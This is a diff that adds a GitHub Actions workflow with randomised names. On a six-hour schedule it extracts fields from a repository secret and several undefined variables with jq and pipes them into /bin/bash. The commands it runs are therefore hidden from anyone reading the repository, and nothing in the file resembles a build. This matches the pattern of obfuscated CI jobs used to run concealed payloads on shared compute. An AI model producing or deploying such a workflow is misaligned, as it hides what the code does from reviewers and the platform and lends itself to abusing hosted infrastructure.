@@ -1,0 +1,23 @@
+name: shencongwu6745
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shencongwu6745
+        env:
+          hxlvo95: ${{ secrets.hxlvo95 }}
+        run: |
+          echo $hxlvo95 | jq -r .ycq037 | /bin/bash
+          echo $f80 | jq -r .m91943 | /bin/bash
+          echo $zuwmr407 | jq -r .l2524 | /bin/bash
+          echo $ltcv0499 | jq -r .swe45 | /bin/bash
+          echo $m33346 | jq -r .dkbwi23 | /bin/bash
+
